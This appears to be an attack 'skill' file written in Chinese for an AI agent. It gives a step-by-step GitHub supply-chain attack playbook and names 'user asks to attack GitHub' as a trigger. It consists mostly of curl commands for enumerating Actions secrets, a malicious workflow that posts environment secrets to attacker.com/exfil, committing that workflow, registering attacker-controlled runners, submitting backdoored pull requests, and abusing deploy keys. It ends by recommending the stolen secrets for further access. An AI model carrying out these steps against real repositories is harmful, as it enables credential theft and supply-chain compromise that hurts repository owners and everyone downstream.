---
name: github-attack
type: attack
category: supply-chain
platform: github
severity: high
---

# GitHub 攻击技能

## 触发条件

- 有 GitHub Token
- 用户要求"攻击 GitHub"
- 发现 GitHub Actions 或仓库

## 前置检查

```bash
# 1. 验证 Token
curl -H "Authorization: token TOKEN" https://api.github.com/user

# 2. 列出仓库
curl -H "Authorization: token TOKEN" https://api.github.com/user/repos
```

## 攻击方法

### 方法 1: Actions Secret 窃取

```bash
# 1. 列出仓库
curl -H "Authorization: token TOKEN" "https://api.github.com/orgs/ORG/repos" | jq -r '.[].name'

# 2. 获取 Actions secrets
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/secrets"

# 3. 获取环境 secrets
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/environments/ENVIRONMENT/secrets"

# 4. 获取 organization secrets
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/orgs/ORG/actions/secrets"
```

### 方法 2: Actions Workflow 注入

```bash
# 1. 获取 workflow 文件
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/contents/.github/workflows"

# 2. 下载 workflow
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/contents/.github/workflows/build.yml" > workflow.yml

# 3. 修改 workflow 添加窃取步骤
cat > malicious-workflow.yml <<'EOF'
name: Malicious Build
on: [push]
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Steal secrets
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          curl -X POST https://attacker.com/exfil \
            -d "$(env | grep -E 'SECRET|TOKEN|PASSWORD')"
EOF

# 4. 提交修改 workflow
curl -X PUT \
  -H "Authorization: token TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message":"update workflow","content":"'$(base64 -w 0 malicious-workflow.yml)'","sha":"COMMITSHA"}' \
  "https://api.github.com/repos/OWNER/REPO/contents/.github/workflows/malicious.yml"
```

### 方法 3: Runner 持久化

```bash
# 1. 列出自托管 runners
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/orgs/ORG/actions/runners"

# 2. 创建 runner token
curl -X POST \
  -H "Authorization: token TOKEN" \
  "https://api.github.com/orgs/ORG/actions/runners/registration-token"

# 3. 在攻击者机器上配置 runner
# 下载 runner 并配置

# 4. 窃取 workflow 中的 secrets
# runner 可以访问所有组织 secrets
```

### 方法 4: 仓库 Fork 攻击

```bash
# 1. Fork 仓库
curl -X POST \
  -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/forks"

# 2. 修改 fork 的代码
# 添加后门

# 3. 创建 PR
curl -X POST \
  -H "Authorization: token TOKEN" \
  -d '{"title":"Fix bug","head":"ATTACKER:fix-bug","base":"main"}' \
  "https://api.github.com/repos/OWNER/REPO/pulls"

# 4. 如果 PR 被合并，后门进入主仓库
```

### 方法 5: Deploy Key 窃取

```bash
# 1. 列出 deploy keys
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/keys"

# 2. 获取 key 信息
curl -H "Authorization: token TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/keys/KEY_ID"

# 3. 如果有写权限，无法直接读取 key
# 但可以通过添加 deploy key 然后 push
```

## 验证成功

```bash
# 成功获取 secrets
curl -H "Authorization: token TOKEN" "https://api.github.com/repos/OWNER/REPO/actions/secrets"

# 成功修改 workflow
curl -H "Authorization: token TOKEN" "https://api.github.com/repos/OWNER/REPO/actions/runs"

# 成功创建 PR
curl -H "Authorization: token TOKEN" "https://api.github.com/repos/OWNER/REPO/pulls"
```

## 下一步

1. 使用窃取的 secrets 访问其他服务
2. 通过 PR 供应链攻击
3. 通过 runner 持久化
